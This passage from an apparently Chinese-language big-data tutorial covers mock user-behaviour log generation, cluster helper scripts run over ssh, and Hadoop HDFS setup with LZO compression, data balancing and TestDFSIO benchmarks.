"http://hdp1/applog"#kafka模式下，发送的地址mock:  kafka-server: "hdp1:9092,hdp2:9092,hdp3:9092"  kafka-topic: "ODS_BASE_LOG"#启动次数mock.startup.count: 200#设备最大值mock.max.mid: 500000#会员最大值mock.max.uid: 100#商品最大值mock.max.sku-id: 35#页面平均访问时间mock.page.during-time-ms: 20000#错误概率 百分比mock.error.rate: 3#每条日志发送延迟 msmock.log.sleep: 10#商品详情来源  用户查询，商品推广，智能推荐, 促销活动mock.detail.source-type-rate: "40:25:15:20"#领取购物券概率mock.if_get_coupon_rate: 75#购物券最大idmock.max.coupon-id: 3#搜索关键词  mock.search.keyword: "图书,小米,iphone11,电视,口红,ps5,苹果手机,小米盒子"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（2）path.json，该文件用来配置访问路径</p><p>根据需求，可以灵活配置用户点击路径。</p><p>来到主页-搜索-上篇-下单-。。</p><pre class="line-numbers language-json"><code class="language-json"><span class="token punctuation">[</span>  &amp;#<span class="token number">123</span><span class="token punctuation">;</span><span class="token property">"path"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"home"</span><span class="token punctuation">,</span><span class="token string">"good_list"</span><span class="token punctuation">,</span><span class="token string">"good_detail"</span><span class="token punctuation">,</span><span class="token string">"cart"</span><span class="token punctuation">,</span><span class="token string">"trade"</span><span class="token punctuation">,</span><span class="token string">"payment"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"rate"</span><span class="token operator">:</span><span class="token number">20</span> &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>  &amp;#<span class="token number">123</span><span class="token punctuation">;</span><span class="token property">"path"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"home"</span><span class="token punctuation">,</span><span class="token string">"search"</span><span class="token punctuation">,</span><span class="token string">"good_list"</span><span class="token punctuation">,</span><span class="token string">"good_detail"</span><span class="token punctuation">,</span><span class="token string">"login"</span><span class="token punctuation">,</span><span class="token string">"good_detail"</span><span class="token punctuation">,</span><span class="token string">"cart"</span><span class="token punctuation">,</span><span class="token string">"trade"</span><span class="token punctuation">,</span><span class="token string">"payment"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"rate"</span><span class="token operator">:</span><span class="token number">40</span> &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>  &amp;#<span class="token number">123</span><span class="token punctuation">;</span><span class="token property">"path"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"home"</span><span class="token punctuation">,</span><span class="token string">"mine"</span><span class="token punctuation">,</span><span class="token string">"orders_unpaid"</span><span class="token punctuation">,</span><span class="token string">"trade"</span><span class="token punctuation">,</span><span class="token string">"payment"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"rate"</span><span class="token operator">:</span><span class="token number">10</span> &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>  &amp;#<span class="token number">123</span><span class="token punctuation">;</span><span class="token property">"path"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"home"</span><span class="token punctuation">,</span><span class="token string">"mine"</span><span class="token punctuation">,</span><span class="token string">"orders_unpaid"</span><span class="token punctuation">,</span><span class="token string">"good_detail"</span><span class="token punctuation">,</span><span class="token string">"good_spec"</span><span class="token punctuation">,</span><span class="token string">"comment"</span><span class="token punctuation">,</span><span class="token string">"trade"</span><span class="token punctuation">,</span><span class="token string">"payment"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"rate"</span><span class="token operator">:</span><span class="token number">5</span> &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>  &amp;#<span class="token number">123</span><span class="token punctuation">;</span><span class="token property">"path"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"home"</span><span class="token punctuation">,</span><span class="token string">"mine"</span><span class="token punctuation">,</span><span class="token string">"orders_unpaid"</span><span class="token punctuation">,</span><span class="token string">"good_detail"</span><span class="token punctuation">,</span><span class="token string">"good_spec"</span><span class="token punctuation">,</span><span class="token string">"comment"</span><span class="token punctuation">,</span><span class="token string">"home"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"rate"</span><span class="token operator">:</span><span class="token number">5</span> &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>  &amp;#<span class="token number">123</span><span class="token punctuation">;</span><span class="token property">"path"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"home"</span><span class="token punctuation">,</span><span class="token string">"good_detail"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"rate"</span><span class="token operator">:</span><span class="token number">10</span> &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span>  &amp;#<span class="token number">123</span><span class="token punctuation">;</span><span class="token property">"path"</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token string">"home"</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"rate"</span><span class="token operator">:</span><span class="token number">10</span> &amp;#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（3）logback配置文件</p><p>可配置日志生成路径，修改内容如下</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="UTF-8"?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>configuration</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>LOG_HOME<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/opt/module/applog/log<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>console<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ch.qos.logback.core.ConsoleAppender<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>encoder</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pattern</span><span class="token punctuation">></span></span>%msg%n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pattern</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>encoder</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>appender</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rollingFile<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ch.qos.logback.core.rolling.RollingFileAppender<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>rollingPolicy</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>ch.qos.logback.core.rolling.TimeBasedRollingPolicy<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>fileNamePattern</span><span class="token punctuation">></span></span>$<span class="token entity" title="&#123;">&amp;#123;</span>LOG_HOME<span class="token entity" title="&#125;">&amp;#125;</span>/app.%d<span class="token entity" title="&#123;">&amp;#123;</span>yyyy-MM-dd<span class="token entity" title="&#125;">&amp;#125;</span>.log<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>fileNamePattern</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>rollingPolicy</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>encoder</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pattern</span><span class="token punctuation">></span></span>%msg%n<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pattern</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>encoder</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>appender</span><span class="token punctuation">></span></span>    <span class="token comment" spellcheck="true">&lt;!-- 将某一个包下日志单独打印日志 --></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>logger</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>com.atgugu.gmall2020.mock.log.util.LogUtil<span class="token punctuation">"</span></span>            <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>INFO<span class="token punctuation">"</span></span> <span class="token attr-name">additivity</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>false<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender-ref</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rollingFile<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender-ref</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>console<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>logger</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>root</span> <span class="token attr-name">level</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>error<span class="token punctuation">"</span></span>  <span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>appender-ref</span> <span class="token attr-name">ref</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>console<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>root</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>configuration</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3）生成日志</p><p>（1）进入到/opt/module/applog路径，执行以下命令</p><pre><code>[molly@hadoop102 applog]$ java -jar gmall2020-mock-log-2021-01-22.jar</code></pre><p>（2）在/opt/module/applog/log目录下查看生成日志</p><pre><code>[molly@hadoop102 log]$ ll</code></pre><h3 id="3-4-2-集群日志生成脚本"><a href="#3-4-2-集群日志生成脚本" class="headerlink" title="3.4.2 集群日志生成脚本"></a>3.4.2 集群日志生成脚本</h3><p>在生成日志的时候模拟多台服务器生产的日志。在hadoop102的/home/molly目录下创建bin目录，这样脚本可以在服务器的任何目录执行。</p><pre><code>[molly@hadoop102 ~]$ echo $PATH/usr/local/bin:/usr/bin:/usr/local/sbin:/usr/sbin:/home/molly/.local/bin:/home/molly/bin</code></pre><p>​    1）在/home/molly/bin目录下创建脚本lg.sh</p><pre><code>[molly@hadoop102 bin]$ vim lg.sh</code></pre><p>​    2）在脚本中编写如下内容</p><pre class="line-numbers language-sh"><code class="language-sh">#!/bin/bashfor i in hadoop102 hadoop103; do    echo "========== $i =========="    ssh $i "cd /opt/module/applog/; java -jar gmall2020-mock-log-2021-01-22.jar >/dev/null 2>&1 &"done <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注：</p><p>（1）/opt/module/applog/为jar包及配置文件所在路径</p><p>（2）/dev/null代表linux的空设备文件，所有往这个文件里面写入的内容都会丢失，俗称“黑洞”。</p><p>标准输入0：从键盘获得输入 /proc/self/fd/0 </p><p>标准输出1：输出到屏幕（即控制台） /proc/self/fd/1 </p><p>错误输出2：输出到屏幕（即控制台） /proc/self/fd/2</p><p>3）修改脚本执行权限</p><pre><code>[molly@hadoop102 bin]$ chmod u+x lg.sh</code></pre><p>4）将jar包及配置文件s上传至hadoop103的/opt/module/applog/路径</p><p>5）启动脚本</p><pre><code>[molly@hadoop102 module]$ lg.sh </code></pre><p>6）分别在hadoop102、hadoop103的/opt/module/applog/log目录上查看生成的数据</p><pre><code>[molly@hadoop102 logs]$ lsapp.2020-06-14.log[molly@hadoop103 logs]$ lsapp.2020-06-14.log</code></pre><h1 id="4-数据采集模块"><a href="#4-数据采集模块" class="headerlink" title="4 数据采集模块"></a>4 数据采集模块</h1><h2 id="4-1-集群所有进程查看脚本"><a href="#4-1-集群所有进程查看脚本" class="headerlink" title="4.1 集群所有进程查看脚本"></a>4.1 集群所有进程查看脚本</h2><p>1）在/home/molly/bin目录下创建脚本xcall.sh</p><pre><code>[molly@hadoop102 bin]$ vim xcall.sh</code></pre><p> 2）在脚本中编写如下内容</p><pre class="line-numbers language-sh"><code class="language-sh">#! /bin/bashfor i in hadoop102 hadoop103 hadoop104do    echo --------- $i ----------    ssh $i "$*"done<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3）修改脚本执行权限</p><pre><code>[molly@hadoop102 bin]$ chmod 777 xcall.sh</code></pre><p>4）启动脚本</p><pre><code>[molly@hadoop102 bin]$ xcall.sh jps</code></pre><h2 id="4-2-Hadoop安装"><a href="#4-2-Hadoop安装" class="headerlink" title="4.2 Hadoop安装"></a>4.2 Hadoop安装</h2><p>详见：<a href="https://m01ly.github.io/2020/11/12/bigdata-hdfs1/">Hadoop 教程（二）安装hadoop集群-完全分布式部署</a>                  </p><p>1）集群规划：</p><table><thead><tr><th></th><th>服务器hadoop102</th><th>服务器hadoop103</th><th>服务器hadoop104</th></tr></thead><tbody><tr><td>HDFS</td><td>NameNode  DataNode</td><td>DataNode</td><td>DataNode  SecondaryNameNode</td></tr><tr><td>Yarn</td><td>NodeManager</td><td>Resourcemanager  NodeManager</td><td>NodeManager</td></tr></tbody></table><p>注意：尽量使用离线方式安装。第一次启动需要格式化namenode.</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 bin<span class="token punctuation">]</span>hdfs namenode -format<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-2-1-项目经验之HDFS存储多目录"><a href="#4-2-1-项目经验之HDFS存储多目录" class="headerlink" title="4.2.1 项目经验之HDFS存储多目录"></a>4.2.1 项目经验之HDFS存储多目录</h3><p>datanode和namenode都可以多目录存储。namenode不同目录的数据都是一样的，所以这里我们不配namenode的多目录。但是datanode的多目录中每个目录存储的数据是不一样的，可以多目录（磁盘挂载到的对应目录。因此用不同磁盘来存储Datanode，实现方式就是：datanode配置多目录）</p><p>1）生产环境服务器磁盘情况</p><p>从当前服务器可以看到：4个磁盘挂载在不同的目录。</p><p>  <img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637661734977.png" alt="1637661734977"></p><p>2）在hdfs-site.xml文件中配置多目录，注意新挂载磁盘的访问权限问题。</p><p>HDFS的DataNode节点保存数据的路径由dfs.datanode.data.dir参数决定，其默认值为file://${hadoop.tmp.dir}/dfs/data，若服务器有多个磁盘，必须对该参数进行修改。如服务器磁盘如上图所示，则该参数应修改为如下的值。</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>dfs.datanode.data.dir<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>file:///dfs/data1,file:///hd2/dfs/data2,file:///hd3/dfs/data3,file:///hd4/dfs/data4<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>注意：每台服务器挂载的磁盘不一样，所以每个节点的多目录配置可以不一致。单独配置即可。</p><h3 id="4-2-2-集群数据均衡"><a href="#4-2-2-集群数据均衡" class="headerlink" title="4.2.2 集群数据均衡"></a>4.2.2 集群数据均衡</h3><p><strong>1）节点间数据均衡</strong>:就是102 103 104之间的</p><p>下面由于人工操作会导致三台节点的存储数据不均衡，如下图所示：<img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637662122810.png" alt="1637662122810"></p><p>解决办法：开启数据均衡命令：</p><pre class="line-numbers language-bash"><code class="language-bash">start-balancer.sh -threshold 10<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对于参数10，代表的是集群中各个节点的磁盘空间利用率相差不超过10%，可根据实际情况进行调整。</p><p>停止数据均衡命令：</p><pre class="line-numbers language-bash"><code class="language-bash">stop-balancer.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>2）磁盘间数据均衡</strong></p><p>hadoop3.x的新特性：针对磁盘间的数据均衡</p><p>（1）生成均衡计划（我们只有一块磁盘，不会生成计划）</p><pre class="line-numbers language-bash"><code class="language-bash">hdfs diskbalancer -plan hadoop103<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（2）执行均衡计划</p><pre class="line-numbers language-bash"><code class="language-bash">hdfs diskbalancer -execute hadoop103.plan.json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（3）查看当前均衡任务的执行情况</p><pre class="line-numbers language-bash"><code class="language-bash">hdfs diskbalancer -query hadoop103<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>（4）取消均衡任务</p><pre class="line-numbers language-bash"><code class="language-bash">hdfs diskbalancer -cancel hadoop103.plan.json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-2-3-项目经验之支持LZO压缩配置"><a href="#4-2-3-项目经验之支持LZO压缩配置" class="headerlink" title="4.2.3 项目经验之支持LZO压缩配置"></a>4.2.3 项目经验之支持LZO压缩配置</h3><p>1）hadoop本身并不支持lzo压缩，故需要使用twitter提供的<a href="https://github.com/twitter/hadoop-lzo">hadoop-lzo</a>开源组件。hadoop-lzo需依赖hadoop和lzo进行编译。</p><p>2）将编译好后的hadoop-lzo-0.4.20.jar 放入hadoop-3.1.3/share/hadoop/common/</p><pre><code>[molly@hadoop102 common]$ pwd/opt/module/hadoop-3.1.3/share/hadoop/common[molly@hadoop102 common]$ lshadoop-lzo-0.4.20.jar</code></pre><p>3）同步hadoop-lzo-0.4.20.jar到hadoop103、hadoop104</p><pre><code>[molly@hadoop102 common]$ xsync hadoop-lzo-0.4.20.jar</code></pre><p>4）core-site.xml增加配置支持LZO压缩</p><pre><code>&lt;configuration&gt;  &lt;property&gt;​    &lt;name&gt;io.compression.codecs&lt;/name&gt;​    &lt;value&gt;​      org.apache.hadoop.io.compress.GzipCodec,​      org.apache.hadoop.io.compress.DefaultCodec,​      org.apache.hadoop.io.compress.BZip2Codec,​      org.apache.hadoop.io.compress.SnappyCodec,​      com.hadoop.compression.lzo.LzoCodec,​      com.hadoop.compression.lzo.LzopCodec​    &lt;/value&gt;  &lt;/property&gt;  &lt;property&gt;​    &lt;name&gt;io.compression.codec.lzo.class&lt;/name&gt;​    &lt;value&gt;com.hadoop.compression.lzo.LzoCodec&lt;/value&gt;  &lt;/property&gt;&lt;/configuration&gt;</code></pre><p>5）同步core-site.xml到hadoop103、hadoop104</p><pre><code>[molly@hadoop102 hadoop]$ xsync core-site.xml</code></pre><p>6）启动及查看集群</p><pre><code>[molly@hadoop102 hadoop-3.1.3]$ sbin/start-dfs.sh[molly@hadoop103 hadoop-3.1.3]$ sbin/start-yarn.sh</code></pre><h3 id="4-2-4-测试LZO"><a href="#4-2-4-测试LZO" class="headerlink" title="4.2.4 测试LZO"></a>4.2.4 测试LZO</h3><p>（1）执行wordcount程序</p><pre><code>[molly@hadoop102 module]$ hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar wordcount -Dmapreduce.job.inputformat.class=com.hadoop.mapreduce.LzoTextInputFormat /input /lzo-output</code></pre><p>​    <img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637662603236.png" alt="1637662603236"></p><h3 id="4-2-4-项目经验之LZO创建索引"><a href="#4-2-4-项目经验之LZO创建索引" class="headerlink" title="4.2.4 项目经验之LZO创建索引"></a>4.2.4 项目经验之LZO创建索引</h3><p>1）创建LZO文件的索引，LZO压缩文件的可切片特性依赖于其索引，故我们需要手动为LZO压缩文件创建索引。若无索引，则LZO文件的切片只有一个。</p><pre><code>hadoop jar /path/to/your/hadoop-lzo.jar com.hadoop.compression.lzo.DistributedLzoIndexer big_file.lzo</code></pre><p>2）测试</p><p>​    （1）将bigtable.lzo（200M）上传到集群的根目录</p><pre><code>[molly@hadoop102 module]$ hadoop fs -mkdir /input[molly@hadoop102 module]$ hadoop fs -put bigtable.lzo /input</code></pre><p>​    <img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637662802344.png" alt="1637662802344"></p><p>（2）执行wordcount程序</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar wordcount -Dmapreduce.job.inputformat.class<span class="token operator">=</span>com.hadoop.mapreduce.LzoTextInputFormat /input /output1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 允许发现切片只有一个，因此想起原理，Lzo切片是依赖于索引的，因此我们需要建索引</p><p>（3）对上传的LZO文件建索引</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 module<span class="token punctuation">]</span>$ hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/common/hadoop-lzo-0.4.20.jar com.hadoop.compression.lzo.DistributedLzoIndexer /input/bigtable.lzo<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>   <img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637662962636.png" alt="1637662962636"></p><p>（4）再次执行WordCount程序</p><p>这里注意需要指定inputformat类为LzoText对应的类com.hadoop.mapreduce.LzoTextInputFormat</p><pre><code>[molly@hadoop102 module]$ hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-examples-3.1.3.jar wordcount -Dmapreduce.job.inputformat.class=com.hadoop.mapreduce.LzoTextInputFormat /input /output2</code></pre><p> 发现切片数为2。查看历史服务器去查看具体切片信息。<img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637662988690.png" alt="1637662988690"></p><p>  map执行过程中切片信息。<img src="/2020/11/23/bigdata-datacollect1-userbehavior/1637663231181.png" alt="1637663231181"></p><p>3）注意：如果以上任务，在运行过程中报如下异常</p><pre><code>Container [pid=8468,containerID=container_1594198338753_0001_01_000002] is running 318740992B beyond the &#39;VIRTUAL&#39; memory limit. Current usage: 111.5 MB of 1 GB physical memory used; 2.4 GB of 2.1 GB virtual memory used. Killing container.Dump of the process-tree for container_1594198338753_0001_01_000002 :</code></pre><p>解决办法：在hadoop102的/opt/module/hadoop-3.1.3/etc/hadoop/yarn-site.xml文件中增加如下配置，然后分发到hadoop103、hadoop104服务器上，并重新启动集群。</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token comment" spellcheck="true">&lt;!--是否启动一个线程检查每个任务正使用的物理内存量，如果任务超出分配值，则直接将其杀掉，默认是true --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.nodemanager.pmem-check-enabled<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span class="token comment" spellcheck="true">&lt;!--是否启动一个线程检查每个任务正使用的虚拟内存量，如果任务超出分配值，则直接将其杀掉，默认是true --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>property</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>yarn.nodemanager.vmem-check-enabled<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">></span></span>false<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>property</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-2-5-项目经验之基准测试"><a href="#4-2-5-项目经验之基准测试" class="headerlink" title="4.2.5 项目经验之基准测试"></a>4.2.5 项目经验之基准测试</h3><p><strong>1） 测试HDFS写性能</strong></p><p>​    测试内容：向HDFS集群写10个128M的文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 mapreduce<span class="token punctuation">]</span>$ hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-client-jobclient-3.1.3-tests.jar TestDFSIO -write -nrFiles 6 -fileSize 128MB2020-04-16 13:41:24,724 INFO fs.TestDFSIO: ----- TestDFSIO ----- <span class="token keyword">:</span> <span class="token function">write</span>2020-04-16 13:41:24,724 INFO fs.TestDFSIO:       Date <span class="token operator">&amp;</span> time: Thu Apr 16 13:41:24 CST 20202020-04-16 13:41:24,724 INFO fs.TestDFSIO:     Number of files: 102020-04-16 13:41:24,725 INFO fs.TestDFSIO: Total MBytes processed: 12802020-04-16 13:41:24,725 INFO fs.TestDFSIO:    Throughput mb/sec: 8.882020-04-16 13:41:24,725 INFO fs.TestDFSIO: Average IO rate mb/sec: 8.962020-04-16 13:41:24,725 INFO fs.TestDFSIO:  IO rate std deviation: 0.872020-04-16 13:41:24,725 INFO fs.TestDFSIO:   Test <span class="token function">exec</span> <span class="token function">time</span> sec: 67.61<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2）测试HDFS读性能</p><p>测试内容：读取HDFS集群10个128M的文件</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 mapreduce<span class="token punctuation">]</span>$ hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-client-jobclient-3.1.3-tests.jar TestDFSIO -read -nrFiles 10 -fileSize 128MB2020-04-16 13:43:38,857 INFO fs.TestDFSIO: ----- TestDFSIO ----- <span class="token keyword">:</span> <span class="token function">read</span>2020-04-16 13:43:38,858 INFO fs.TestDFSIO:   Date <span class="token operator">&amp;</span> time: Thu Apr 16 13:43:38 CST 20202020-04-16 13:43:38,859 INFO fs.TestDFSIO:         Number of files: 102020-04-16 13:43:38,859 INFO fs.TestDFSIO:  Total MBytes processed: 12802020-04-16 13:43:38,859 INFO fs.TestDFSIO:       Throughput mb/sec: 85.542020-04-16 13:43:38,860 INFO fs.TestDFSIO:  Average IO rate mb/sec: 100.212020-04-16 13:43:38,860 INFO fs.TestDFSIO:   IO rate std deviation: 44.372020-04-16 13:43:38,860 INFO fs.TestDFSIO:      Test <span class="token function">exec</span> <span class="token function">time</span> sec: 53.61<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3）删除测试生成数据</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>molly@hadoop102 mapreduce<span class="token punctuation">]</span>$ hadoop jar /opt/module/hadoop-3.1.3/share/hadoop/mapreduce/hadoop-mapreduce-client-jobclient-3.1.3-tests.jar TestDFSIO -clean<span aria-hidden="true" 